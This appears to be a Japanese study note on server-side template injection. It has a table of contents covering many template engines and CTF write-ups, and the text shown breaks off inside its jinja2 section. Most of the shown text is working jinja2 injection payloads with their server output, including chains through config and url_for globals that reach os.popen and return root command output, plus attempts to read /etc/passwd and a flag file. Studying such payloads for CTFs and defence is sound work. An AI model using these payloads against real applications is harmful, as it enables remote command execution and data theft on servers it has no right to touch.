<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Server-Side Template Injection](#server-side-template-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [websitesVulnerableToSSTI](#websitesvulnerabletossti)
    - [jinja2](#jinja2)
      - [config](#config)
      - [url_for](#url_for)
      - [request](#request)
      - [\_\_class\_\_](#%5C_%5C_class%5C_%5C_)
  - [tplmap (SSTI practice)](#tplmap-ssti-practice)
    - [setup](#setup)
    - [php](#php)
      - [eval](#eval)
      - [smarty](#smarty)
      - [twig](#twig)
    - [Java](#java)
      - [velocity](#velocity)
      - [freemarker](#freemarker)
    - [python](#python)
      - [eval](#eval-1)
      - [mako](#mako)
      - [jinja2](#jinja2-1)
      - [tornado](#tornado)
    - [Ruby](#ruby)
      - [eval](#eval-2)
      - [slim](#slim)
      - [erb](#erb)
    - [Node.js](#nodejs)
      - [jade (pug)](#jade-pug)
      - [nunjucks](#nunjucks)
      - [javascript (eval)](#javascript-eval)
      - [dot](#dot)
      - [dust](#dust)
      - [marko](#marko)
      - [ejs](#ejs)
- [writeup](#writeup)
  - [jinja2 render_template_string (ISC BugHunt101 CTF 2020)](#jinja2-render_template_string-isc-bughunt101-ctf-2020)
  - [erb / bypass 正規表現 "^" "$" (harkaze 解説記事 2017)](#erb--bypass-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE---harkaze-%E8%A7%A3%E8%AA%AC%E8%A8%98%E4%BA%8B-2017)
  - [jinja2 RCE through __class__.__mro__ (BSidesSF CTF 2017)](#jinja2-rce-through-__class____mro__-bsidessf-ctf-2017)
  - [Django str.format Information Disclosure (CODEGRAY CTF 2018)](#django-strformat-information-disclosure-codegray-ctf-2018)
  - [jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)](#jinja2--lfi--session%E3%81%AB%E6%9A%97%E5%8F%B7%E5%8C%96%E9%8D%B5%E3%81%A7%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%97%E3%81%9F%E5%80%A4%E3%82%92%E3%82%BB%E3%83%83%E3%83%88-asis_ctf-2017-golem)
  - [Jinja2 bypass "." "_" / (Asis CTF Quals 2019)](#jinja2-bypass--_--asis-ctf-quals-2019)
  - [bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog)](#bottle--zip-slip-in-tarfile-interkosenctf-2020-miniblog)
  - [tornado / obtain Cookie's secret_key (csictf 2020 The Usual Suspects)](#tornado--obtain-cookies-secret_key-csictf-2020-the-usual-suspects)
  - [jinja RCE / JWT's secret_key crack (HacktivityConCTF 2020 Template Shack)](#jinja-rce--jwts-secret_key-crack-hacktivityconctf-2020-template-shack)
  - [sample](#sample)
  - [sample](#sample-1)
  - [sample](#sample-2)
  - [Docker環境があるやつ(復習用)](#docker%E7%92%B0%E5%A2%83%E3%81%8C%E3%81%82%E3%82%8B%E3%82%84%E3%81%A4%E5%BE%A9%E7%BF%92%E7%94%A8)
    - [The Usual Suspects (csictf 2020)](#the-usual-suspects-csictf-2020)
    - [miniblog (InterKosenCTF 2020)](#miniblog-interkosenctf-2020)
    - [BuggyBase2 (ISCbughunt101ctf 2020)](#buggybase2-iscbughunt101ctf-2020)
    - [Zumbo (BSidesSF CTF 2017)](#zumbo-bsidessf-ctf-2017)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Server-Side Template Injection
## 概要
`<% %>`とかでViewの中に変数のデータを表示させたいときに、ユーザーの入力をそのTemplate構文の中に
入れるとRCEの脆弱性になるかもしれない。python,php,NodeJS,Ruby,Javaなど様々なTemplate構文においてその危険性がある。   
## websitesVulnerableToSSTI
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   
### jinja2
(見やすくするために出力結果には適宜改行を入れてる。)   
#### config
- `{{config}}`   
```txt
Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False,
'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None,
'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False,
'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session',
'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY':
True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None,
'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None,
'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200),
'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False,
'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII':
True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE':
'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
```
- `{{config.__globals__}}`   
```txt
Hello ! 
```
- `{{config.items()}}`   
```txt
Hello dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False),
('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY',
None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE',
False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME',
'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None),
('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False),
('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True),
('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT',
datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), 
('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), 
('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), 
('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), 
('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])! 
```
- `{{config.items()[4]}}`   
```txt
Hello ! 
```
- `{{config.items()[4][1]}}`   
```txt
Internal Server Error
```
- `{{config[4]}}`   
```txt
Hello ! 
```
- `{{config[4][1]}}`   
```txt
Internal Server Error
```
- `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}`   
```txt
Internal Server Error
```
- `{{config.__class__}}`   
```txt
Hello <class 'flask.config.Config'>! 
```
- `{{config.__class__.__init__}}`   
```txt
Hello <function Config.__init__ at 0x7fc672b83ca0>! 
```
- `{{config.__class__.__init__.__globals__}}`   
```txt
Hello {'__name__': 'flask.config', '__doc__': '\n flask.config\n ~~~~~~~~~~~~\n\n 
Implements the configuration related objects.\n\n :copyright: 2010 Pallets\n :license: 
BSD-3-Clause\n', '__package__': 'flask', '__loader__': 
<_frozen_importlib_external.SourceFileLoader object at 0x7fc672b7f610>, '__spec__': 
ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader 
object at 0x7fc672b7f610>, origin='/usr/local/lib/python3.9/site-
packages/flask/config.py'), '__file__': '/usr/local/lib/python3.9/site-
packages/flask/config.py', '__cached__': '/usr/local/lib/python3.9/site-
packages/flask/__pycache__/config.cpython-39.pyc', '__builtins__': {'__name__': 
'builtins', '__doc__': "Built-in functions, exceptions, and other 
objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 
'__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 
'__spec__': ModuleSpec(name='builtins', loader=<class 
'_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in 
function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-
in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 
'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': 
<built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-
in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function 
delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': 
<built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function 
format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 
'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-
in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 
'isinstance': <built-in function isinstance>, 'issubclass': <built-in function 
issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': 
<built-in function locals>, 'max': <built-in function max>, 'min': <built-in function 
min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in 
function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 
'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-
in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function 
sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 
'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 
'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 
'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': 
<class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': 
<class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 
'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 
'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 
'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 
'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 
'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 
'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 
'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 
'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 
'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 
'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 
'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 
'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 
'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 
'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 
'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 
'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 
'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 
'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': 
<class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 
'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 
'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': 
<class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 
'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 
'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 
'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 
'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 
'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 
'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 
'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 
'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 
'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 
'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 
'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': 
<class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 
'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': 
<class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 
'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 
'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 
'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 
'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': 
<class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D 
(i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': 
Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 
2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National 
Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting 
Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, 
BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. 
See www.python.org for more information., 'license': Type license() to see the full 
license text, 'help': Type help() for interactive help, or help(object) for help about 
object.}, 'errno': <module 'errno' (built-in)>, 'os': <module 'os' from 
'/usr/local/lib/python3.9/os.py'>, 'types': <module 'types' from 
'/usr/local/lib/python3.9/types.py'>, 'import_string': <function import_string at 
0x7fc672fd5310>, 'json': <module 'flask.json' from '/usr/local/lib/python3.9/site-
packages/flask/json/__init__.py'>, 'iteritems': <function <lambda> at 0x7fc672beef70>, 
'string_types': (<class 'str'>,), 'ConfigAttribute': <class 
'flask.config.ConfigAttribute'>, 'Config': <class 'flask.config.Config'>}! 
```
- `{{config.__class__.__init__.__globals__['os']}}`   
```txt
Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
```
- `{{config.__class__.__init__.__globals__['os'].popen('id')}}`   
```txt
Hello <os._wrap_close object at 0x7fc67227c880>! 
```
- `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`   
```txt
Hello uid=0(root) gid=0(root) groups=0(root) ! 
```
#### url_for
- `{{url_for}}`   
```txt
Hello <function url_for at 0x7fc672b945e0>! 
```
- `{{url_for.__globals__}}`   
```txt
Hello {'__name__': 'flask.helpers', '__doc__': '\n flask.helpers\n ~~~~~~~~~~~~~\n\n 
Implements various helpers.\n\n :copyright: 2010 Pallets\n :license: BSD-3-Clause\n', 
'__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader 
object at 0x7fc672b43b20>, '__spec__': ModuleSpec(name='flask.helpers', loader=
<_frozen_importlib_external.SourceFileLoader object at 0x7fc672b43b20>, 
origin='/usr/local/lib/python3.9/site-packages/flask/helpers.py'), '__file__': 
'/usr/local/lib/python3.9/site-packages/flask/helpers.py', '__cached__': 
'/usr/local/lib/python3.9/site-packages/flask/__pycache__/helpers.cpython-39.pyc', 
'__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and 
other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in 
slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 
'__spec__': ModuleSpec(name='builtins', loader=<class 
'_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in 
function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-
in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 
'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': 
<built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-
in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function 
delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': 
<built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function 
format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 
'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-
in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 
'isinstance': <built-in function isinstance>, 'issubclass': <built-in function 
issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': 
<built-in function locals>, 'max': <built-in function max>, 'min': <built-in function 
min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in 
function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 
'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-
in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function 
sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 
'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 
'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 
'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': 
<class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': 
<class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 
'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 
'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 
'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 
'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 
'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 
'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 
'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 
'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 
'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 
'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 
'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 
'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 
'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 
'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 
'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 
'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 
'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 
'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': 
<class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 
'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 
'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': 
<class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 
'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 
'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 
'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 
'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 
'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 
'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 
'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 
'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 
'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 
'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 
'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': 
<class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 
'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': 
<class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 
'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 
'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 
'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 
'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': 
<class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D 
(i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': 
Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 
2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National 
Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting 
Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, 
BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. 
See www.python.org for more information., 'license': Type license() to see the full 
license text, 'help': Type help() for interactive help, or help(object) for help about 
object.}, 'io': <module 'io' from '/usr/local/lib/python3.9/io.py'>, 'mimetypes': 
<module 'mimetypes' from '/usr/local/lib/python3.9/mimetypes.py'>, 'os': <module 'os' 
from '/usr/local/lib/python3.9/os.py'>, 'pkgutil': <module 'pkgutil' from 
'/usr/local/lib/python3.9/pkgutil.py'>, 'posixpath': <module 'posixpath' from 
'/usr/local/lib/python3.9/posixpath.py'>, 'socket': <module 'socket' from 
'/usr/local/lib/python3.9/socket.py'>, 'sys': <module 'sys' (built-in)>, 'unicodedata': 
<module 'unicodedata' from '/usr/local/lib/python3.9/lib-dynload/unicodedata.cpython-39-
x86_64-linux-gnu.so'>, 'update_wrapper': <function update_wrapper at 0x7fc673c971f0>, 
'RLock': <function RLock at 0x7fc6739bd820>, 'time': <built-in function time>, 
'adler32': <built-in function adler32>, 'FileSystemLoader': <class 
'jinja2.loaders.FileSystemLoader'>, 'Headers': <class 
'werkzeug.datastructures.Headers'>, 'BadRequest': <class 
'werkzeug.exceptions.BadRequest'>, 'NotFound': <class 'werkzeug.exceptions.NotFound'>, 
'RequestedRangeNotSatisfiable': <class 
'werkzeug.exceptions.RequestedRangeNotSatisfiable'>, 'BuildError': <class 
'werkzeug.routing.BuildError'>, 'url_quote': <function url_quote at 0x7fc672fecf70>, 
'wrap_file': <function wrap_file at 0x7fc672cdd820>, 'fspath': <built-in function 
fspath>, 'PY2': False, 'string_types': (<class 'str'>,), 'text_type': <class 'str'>, 
'_app_ctx_stack': <werkzeug.local.LocalStack object at 0x7fc672bf4310>, 
'_request_ctx_stack': <werkzeug.local.LocalStack object at 0x7fc672be6f10>, 
'current_app': <Flask 'server'>, 'request': <Request 'http://192.168.99.100:5000/' 
[POST]>, 'session': <NullSession {}>, 'message_flashed': <flask.signals._FakeSignal 
object at 0x7fc672b867c0>, '_missing': <object object at 0x7fc672d8b4b0>, 
'_os_alt_seps': [], 'get_env': <function get_env at 0x7fc672b94040>, 'get_debug_flag': 
<function get_debug_flag at 0x7fc672b940d0>, 'get_load_dotenv': <function 
get_load_dotenv at 0x7fc672b943a0>, '_endpoint_from_view_func': <function 
_endpoint_from_view_func at 0x7fc672b94430>, 'stream_with_context': <function 
stream_with_context at 0x7fc672b944c0>, 'make_response': <function make_response at 
0x7fc672b94550>, 'url_for': <function url_for at 0x7fc672b945e0>, 
'get_template_attribute': <function get_template_attribute at 0x7fc672b94670>, 'flash': 
<function flash at 0x7fc672b94700>, 'get_flashed_messages': <function 
get_flashed_messages at 0x7fc672b94790>, 'send_file': <function send_file at 
0x7fc672b94820>, 'safe_join': <function safe_join at 0x7fc672b948b0>, 
'send_from_directory': <function send_from_directory at 0x7fc672b94940>, 
'get_root_path': <function get_root_path at 0x7fc672b949d0>, 
'_matching_loader_thinks_module_is_package': <function 
_matching_loader_thinks_module_is_package at 0x7fc672b94a60>, '_find_package_path': 
<function _find_package_path at 0x7fc672b94af0>, 'find_package': <function find_package 
at 0x7fc672b94b80>, 'locked_cached_property': <class 
'flask.helpers.locked_cached_property'>, '_PackageBoundObject': <class 
'flask.helpers._PackageBoundObject'>, 'total_seconds': <function total_seconds at 
0x7fc672b94c10>, 'is_ip': <function is_ip at 0x7fc672b933a0>}! 
```
- `{{url_for.__globals__.__getitem__}}`   
```txt
Hello <built-in method __getitem__ of dict object at 0x7fc672baeec0>! 
```
- `{{url_for.__globals__.__getitem__('os')}}`   
```txt
Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
```
- `{{url_for.__globals__.__getitem__('os').listdir('./')}}`   
```txt
Hello ['server.py', 'run.sh', 'requirements.sh']! 
```
- `{{url_for.__globals__['os']}}`   
```txt
Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
```
- `{{url_for.__globals__['os'].listdir('./')}}`   
```txt
Hello ['server.py', 'run.sh', 'requirements.sh']! 
```
- `{{url_for.__globals__['os'].popen('id').read()}}`   
```txt
Hello uid=0(root) gid=0(root) groups=0(root) ! 
```
- `{{url_for.__globals__['current_app']}}`   
```txt
Hello <Flask 'server'>! 
```
- `{{url_for.__globals__['current_app'].config}}`   
```txt
Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 
'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 
'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 
'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 
'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': 
True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 
'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 
'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 
'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': 
True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 
'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
```
#### request
- `{{request}}`   
```txt
Hello <Request 'http://192.168.99.100:5000/' [POST]>! 
```
- `{{request.application}}`   
```txt
Hello <bound method BaseRequest.application of <class 'flask.wrappers.Request'>>! 
```
- `{{request.application.globals}}`   
```txt
Hello ! 
```
- `{{request.application.globals.builtins}}`   
```txt
Internal Server Error
```
- `{{request.application.globals.builtins.import(‘os’)}}`   
```txt
Internal Server Error
```
- `{{request.__globals__}}`   
```txt
Hello ! 
```
- `{{request.application.globals.builtins.import(‘os’).popen(‘cat flag.txt’).read()}}`   
```txt
Internal Server Error
```
#### \_\_class\_\_
- `{{''.__class__}}`   
```txt
Hello <class 'str'>! 
```
- `{{''.__class__.__mro__}}`   
```txt
Hello (<class 'str'>, <class 'object'>)! 
```
- `{{''.__class__.__mro__[2]}}`   
```txt
Hello ! 
```
- `{{''.__class__.__mro__[2].__subclasses__()}}`   
```txt
Internal Server Error
```
- `{{ ''.__class__.__mro__[1] }}`   
二つしかないのでindexは1だった…   
```txt
Hello <class 'object'>! 
```
- `{{''.__class__.__mro__[1].__subclasses__()}}`   
この中に`<class 'file'>`がない…   
なので、`''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()`みたいにできない？？   
```txt
Hello [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 
'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, 
<class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, 
<class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 
'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, 
<class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 
'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, 
<class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, 
<class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, 
<class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, 
<class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 
'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 
